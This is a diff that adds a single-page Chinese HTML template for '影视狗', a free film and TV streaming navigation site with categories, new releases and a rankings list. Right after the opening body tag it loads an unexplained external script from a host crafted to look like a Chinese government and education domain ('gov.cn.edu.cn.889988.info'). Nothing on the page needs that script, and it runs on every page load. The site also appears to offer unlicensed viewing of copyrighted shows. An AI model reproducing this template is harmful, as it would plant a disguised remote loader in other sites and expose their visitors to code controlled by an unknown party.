@@ -1,0 +1,491 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>影视狗 - 免费高清影视在线观看 | yingshigou-h5.github.io</title>
+<meta name="description" content="影视狗（yingshigou-h5.github.io）是一个专注于免费高清电影、电视剧、动漫、综艺在线观看的影视导航站点，每日更新最新资源，支持手机电脑自适应访问。">
+<meta name="keywords" content="影视狗, 免费影视, 在线观看, 电影下载, 电视剧, 动漫, yingshigou-h5">
+<meta name="author" content="影视狗">
+<meta name="robots" content="index, follow">
+<style>
+  :root {
+    --bg-dark: #0a0a0f;
+    --bg-card: #12121c;
+    --neon-blue: #00f0ff;
+    --neon-pink: #ff0055;
+    --text-main: #e0e0e0;
+    --text-muted: #8888a0;
+    --border-color: #22223a;
+  }
+  
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  
+  body {
+    font-family: 'Segoe UI', 'Microsoft YaHei', sans-serif;
+    background-color: var(--bg-dark);
+    color: var(--text-main);
+    line-height: 1.6;
+    display: flex;
+    min-height: 100vh;
+  }
+  
+  a { text-decoration: none; color: var(--neon-blue); transition: all 0.3s ease; }
+  a:hover { color: var(--neon-pink); }
+  ul { list-style: none; }
+  
+  /* 侧边栏 */
+  .sidebar {
+    width: 260px;
+    background-color: var(--bg-card);
+    border-right: 1px solid var(--border-color);
+    padding: 2rem 1rem;
+    position: fixed;
+    height: 100vh;
+    overflow-y: auto;
+    z-index: 1000;
+    transition: transform 0.3s ease;
+  }
+  
+  .logo {
+    text-align: center;
+    margin-bottom: 2rem;
+  }
+  
+  .logo h1 {
+    font-size: 2rem;
+    color: #fff;
+    text-transform: uppercase;
+    letter-spacing: 2px;
+    text-shadow: 0 0 10px var(--neon-blue), 0 0 20px var(--neon-blue);
+  }
+  
+  .logo span { color: var(--neon-pink); text-shadow: 0 0 10px var(--neon-pink); }
+  
+  .nav-menu { display: flex; flex-direction: column; gap: 0.5rem; }
+  
+  .nav-menu a {
+    display: block;
+    padding: 1rem 1.5rem;
+    color: var(--text-main);
+    border-radius: 8px;
+    font-weight: 500;
+    border-left: 3px solid transparent;
+  }
+  
+  .nav-menu a:hover, .nav-menu a.active {
+    background: rgba(0, 240, 255, 0.1);
+    color: var(--neon-blue);
+    border-left-color: var(--neon-blue);
+    box-shadow: inset 0 0 10px rgba(0, 240, 255, 0.05);
+  }
+  
+  /* 主内容区 */
+  .main-content {
+    margin-left: 260px;
+    flex: 1;
+    padding: 2rem;
+    max-width: 1200px;
+  }
+  
+  section { margin-bottom: 4rem; }
+  
+  .section-header {
+    margin-bottom: 1.5rem;
+    border-bottom: 1px solid var(--border-color);
+    padding-bottom: 0.5rem;
+    display: flex;
+    align-items: center;
+    gap: 10px;
+  }
+  
+  .section-header h2 {
+    font-size: 1.5rem;
+    color: #fff;
+  }
+  
+  .section-header .icon { font-size: 1.5rem; }
+  
+  /* 栏目1：首页推荐（Hero） */
+  #home {
+    background: linear-gradient(135deg, rgba(0,240,255,0.1) 0%, rgba(255,0,85,0.1) 100%), url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" opacity="0.05"><rect fill="%23fff" width="50" height="50" x="25" y="25"/></svg>');
+    border: 1px solid var(--border-color);
+    border-radius: 16px;
+    padding: 3rem;
+    text-align: center;
+    box-shadow: 0 0 30px rgba(0,0,0,0.5);
+  }
+  
+  #home h2 {
+    font-size: 2.5rem;
+    margin-bottom: 1rem;
+    color: #fff;
+    text-shadow: 0 0 15px rgba(255,255,255,0.3);
+  }
+  
+  #home p { font-size: 1.1rem; color: var(--text-muted); margin-bottom: 2rem; }
+  
+  .search-bar {
+    max-width: 600px;
+    margin: 0 auto;
+    display: flex;
+    background: var(--bg-dark);
+    border: 1px solid var(--neon-blue);
+    border-radius: 30px;
+    overflow: hidden;
+    box-shadow: 0 0 15px rgba(0, 240, 255, 0.2);
+  }
+  
+  .search-bar input {
+    flex: 1;
+    padding: 1rem 1.5rem;
+    border: none;
+    background: transparent;
+    color: #fff;
+    outline: none;
+    font-size: 1rem;
+  }
+  
+  .search-bar button {
+    padding: 1rem 2rem;
+    border: none;
+    background: var(--neon-blue);
+    color: #000;
+    font-weight: bold;
+    cursor: pointer;
+    transition: background 0.3s;
+  }
+  
+  .search-bar button:hover { background: var(--neon-pink); color: #fff; }
+  
+  /* 栏目2：影视分类（网格） */
+  .category-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fill, minmax(150px, 1fr));
+    gap: 1rem;
+  }
+  
+  .cat-item {
+    background: var(--bg-card);
+    border: 1px solid var(--border-color);
+    border-radius: 12px;
+    padding: 1.5rem 1rem;
+    text-align: center;
+    transition: transform 0.3s, box-shadow 0.3s;
+    cursor: pointer;
+  }
+  
+  .cat-item:hover {
+    transform: translateY(-5px);
+    box-shadow: 0 5px 20px rgba(255, 0, 85, 0.2);
+    border-color: var(--neon-pink);
+  }
+  
+  .cat-item .emoji { font-size: 2.5rem; display: block; margin-bottom: 0.5rem; }
+  .cat-item h3 { font-size: 1rem; color: #fff; }
+  
+  /* 栏目3：最新上映（列表） */
+  .update-list { display: flex; flex-direction: column; gap: 1rem; }
+  
+  .update-item {
+    display: flex;
+    align-items: center;
+    background: var(--bg-card);
+    border: 1px solid var(--border-color);
+    border-radius: 10px;
+    padding: 1rem;
+    gap: 1.5rem;
+  }
+  
+  .update-item .ep { 
+    background: var(--neon-pink); 
+    color: #fff; 
+    padding: 0.3rem 0.8rem; 
+    border-radius: 20px; 
+    font-size: 0.85rem;
+    font-weight: bold;
+  }
+  
+  .update-item .title { flex: 1; font-size: 1.1rem; color: #fff; }
+  .update-item .title:hover { text-decoration: underline; }
+  .update-item .date { color: var(--text-muted); font-size: 0.9rem; }
+  
+  /* 栏目4：排行榜（进度条） */
+  .ranking-list { display: flex; flex-direction: column; gap: 1.2rem; }
+  
+  .rank-item { display: flex; align-items: center; gap: 1rem; }
+  
+  .rank-num {
+    font-size: 1.2rem;
+    font-weight: bold;
+    color: var(--text-muted);
+    width: 30px;
+  }
+  
+  .rank-num.top { color: var(--neon-pink); text-shadow: 0 0 10px var(--neon-pink); }
+  
+  .rank-info { flex: 1; }
+  .rank-info h4 { color: #fff; margin-bottom: 0.3rem; font-weight: normal; }
+  
+  .progress-bar {
+    height: 6px;
+    background: var(--bg-card);
+    border-radius: 3px;
+    overflow: hidden;
+  }
+  
+  .progress {
+    height: 100%;
+    background: linear-gradient(90deg, var(--neon-blue), var(--neon-pink));
+    border-radius: 3px;
+  }
+  
+  .rank-score { font-size: 0.9rem; color: var(--neon-blue); width: 40px; text-align: right; }
+  
+  /* 栏目5：关于 */
+  .about-box {
+    background: var(--bg-card);
+    padding: 2rem;
+    border-radius: 16px;
+    border: 1px dashed var(--border-color);
+  }
+  
+  .about-box p { margin-bottom: 1rem; color: var(--text-muted); }
+  .about-box strong { color: var(--neon-blue); }
+  
+  /* 页脚 */
+  .footer {
+    text-align: center;
+    padding: 2rem;
+    border-top: 1px solid var(--border-color);
+    color: var(--text-muted);
+    font-size: 0.9rem;
+  }
+  
+  .footer a { color: var(--neon-pink); }
+  
+  /* 移动端自适应 */
+  @media (max-width: 768px) {
+    body { flex-direction: column; }
+    .sidebar {
+      width: 100%;
+      height: auto;
+      position: relative;
+      padding: 1rem;
+      border-right: none;
+      border-bottom: 1px solid var(--border-color);
+    }
+    .nav-menu { flex-direction: row; overflow-x: auto; white-space: nowrap; padding-bottom: 0.5rem; }
+    .nav-menu a { border-left: none; border-bottom: 2px solid transparent; padding: 0.5rem 1rem; }
+    .nav-menu a:hover { border-bottom-color: var(--neon-blue); }
+    .main-content { margin-left: 0; padding: 1rem; }
+    #home { padding: 2rem 1rem; }
+    #home h2 { font-size: 1.8rem; }
+    .update-item { flex-direction: column; align-items: flex-start; gap: 0.5rem; }
+    .update-item .date { align-self: flex-end; margin-top: -1.5rem; }
+  }
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+  <!-- 侧边导航 -->
+  <aside class="sidebar">
+    <div class="logo">
+      <h1>影视<span>狗</span></h1>
+    </div>
+    <nav class="nav-menu">
+      <a href="#home" class="active">🏠 首页推荐</a>
+      <a href="#categories">📂 影视分类</a>
+      <a href="#latest">🔥 最新上映</a>
+      <a href="#ranking">📊 热播排行</a>
+      <a href="#about">ℹ️ 关于本站</a>
+    </nav>
+  </aside>
+
+  <!-- 主内容 -->
+  <main class="main-content">
+    
+    <!-- 栏目1：首页 -->
+    <section id="home">
+      <h2>欢迎来到影视狗</h2>
+      <p>全网最新影视资源聚合，免费高清在线观看，影视狗带你畅游影音世界。</p>
+      <div class="search-bar">
+        <input type="text" placeholder="搜索电影、电视剧、动漫...">
+        <button type="button">搜 索</button>
+      </div>
+    </section>
+
+    <!-- 栏目2：分类 -->
+    <section id="categories">
+      <div class="section-header">
+        <span class="icon">📂</span>
+        <h2>影视分类</h2>
+      </div>
+      <div class="category-grid">
+        <div class="cat-item">
+          <span class="emoji">🎬</span>
+          <h3>动作片</h3>
+        </div>
+        <div class="cat-item">
+          <span class="emoji">😂</span>
+          <h3>喜剧片</h3>
+        </div>
+        <div class="cat-item">
+          <span class="emoji">🎭</span>
+          <h3>剧情片</h3>
+        </div>
+        <div class="cat-item">
+          <span class="emoji">👻</span>
+          <h3>恐怖片</h3>
+        </div>
+        <div class="cat-item">
+          <span class="emoji">🦸</span>
+          <h3>科幻片</h3>
+        </div>
+        <div class="cat-item">
+          <span class="emoji">📺</span>
+          <h3>国产剧</h3>
+        </div>
+        <div class="cat-item">
+          <span class="emoji">🇺🇸</span>
+          <h3>欧美剧</h3>
+        </div>
+        <div class="cat-item">
+          <span class="emoji">🎨</span>
+          <h3>动漫</h3>
+        </div>
+      </div>
+    </section>
+
+    <!-- 栏目3：最新上映 -->
+    <section id="latest">
+      <div class="section-header">
+        <span class="icon">🔥</span>
+        <h2>最新上映</h2>
+      </div>
+      <div class="update-list">
+        <div class="update-item">
+          <span class="ep">更新至24集</span>
+          <a href="#" class="title">《狂飙2：扫黑风暴》- 国产剧</a>
+          <span class="date">2026-10-18</span>
+        </div>
+        <div class="update-item">
+          <span class="ep">正片</span>
+          <a href="#" class="title">《沙丘3：救世主》- 科幻电影</a>
+          <span class="date">2026-10-17</span>
+        </div>
+        <div class="update-item">
+          <span class="ep">第108话</span>
+          <a href="#" class="title">《咒术回战 第三季》- 日本动漫</a>
+          <span class="date">2026-10-17</span>
+        </div>
+        <div class="update-item">
+          <span class="ep">更新至12期</span>
+          <a href="#" class="title">《极限挑战 第十季》- 综艺节目</a>
+          <span class="date">2026-10-16</span>
+        </div>
+        <div class="update-item">
+          <span class="ep">正片</span>
+          <a href="#" class="title">《奥本海默2》- 历史传记</a>
+          <span class="date">2026-10-15</span>
+        </div>
+      </div>
+    </section>
+
+    <!-- 栏目4：排行榜 -->
+    <section id="ranking">
+      <div class="section-header">
+        <span class="icon">📊</span>
+        <h2>热播排行榜</h2>
+      </div>
+      <div class="ranking-list">
+        <div class="rank-item">
+          <span class="rank-num top">1</span>
+          <div class="rank-info">
+            <h4>《繁花》</h4>
+            <div class="progress-bar"><div class="progress" style="width: 98%;"></div></div>
+          </div>
+          <span class="rank-score">9.8</span>
+        </div>
+        <div class="rank-item">
+          <span class="rank-num top">2</span>
+          <div class="rank-info">
+            <h4>《庆余年2》</h4>
+            <div class="progress-bar"><div class="progress" style="width: 95%;"></div></div>
+          </div>
+          <span class="rank-score">9.5</span>
+        </div>
+        <div class="rank-item">
+          <span class="rank-num top">3</span>
+          <div class="rank-info">
+            <h4>《周处除三害》</h4>
+            <div class="progress-bar"><div class="progress" style="width: 90%;"></div></div>
+          </div>
+          <span class="rank-score">9.2</span>
+        </div>
+        <div class="rank-item">
+          <span class="rank-num">4</span>
+          <div class="rank-info">
+            <h4>《飞驰人生2》</h4>
+            <div class="progress-bar"><div class="progress" style="width: 85%;"></div></div>
+          </div>
+          <span class="rank-score">8.9</span>
+        </div>
+        <div class="rank-item">
+          <span class="rank-num">5</span>
+          <div class="rank-info">
+            <h4>《热辣滚烫》</h4>
+            <div class="progress-bar"><div class="progress" style="width: 80%;"></div></div>
+          </div>
+          <span class="rank-score">8.7</span>
+        </div>
+      </div>
+    </section>
+
+    <!-- 栏目5：关于 -->
+    <section id="about">
+      <div class="section-header">
+        <span class="icon">ℹ️</span>
+        <h2>关于影视狗</h2>
+      </div>
+      <div class="about-box">
+        <p><strong>影视狗（yingshigou-h5.github.io）</strong>是一个专注于提供免费高清影视在线观看的单页导航网站。</p>
+        <p>我们致力于收集互联网上最新、最热门的电影、电视剧、动漫和综艺节目，为用户提供便捷的观看入口。</p>
+        <p>本站采用全响应式设计，无论您使用手机、平板还是电脑，都能获得最佳的浏览体验。影视狗，做您最忠实的影音伴侣。</p>
+      </div>
+    </section>
+
+    <!-- 页脚 -->
+    <footer class="footer">
+      <p>网站名称：<strong>影视狗</strong></p>
+      <p>访问地址：<a href="https://yingshigou-h5.github.io">https://yingshigou-h5.github.io</a></p>
+      <p>© 2026 影视狗 保留所有权利 | 单页演示模板</p>
+    </footer>
+
+  </main>
+
+  <script>
+    // 平滑滚动与导航高亮
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+      anchor.addEventListener('click', function (e) {
+        e.preventDefault();
+        const target = document.querySelector(this.getAttribute('href'));
+        if (target) {
+          target.scrollIntoView({
+            behavior: 'smooth',
+            block: 'start'
+          });
+        }
+      });
+    });
+
+    // 搜索演示
+    document.querySelector('.search-bar button').addEventListener('click', function() {
+      const val = document.querySelector('.search-bar input').value;
+      if(val) alert('影视狗搜索演示：' + val);
+    });
+  </script>
+</body>
+</html>
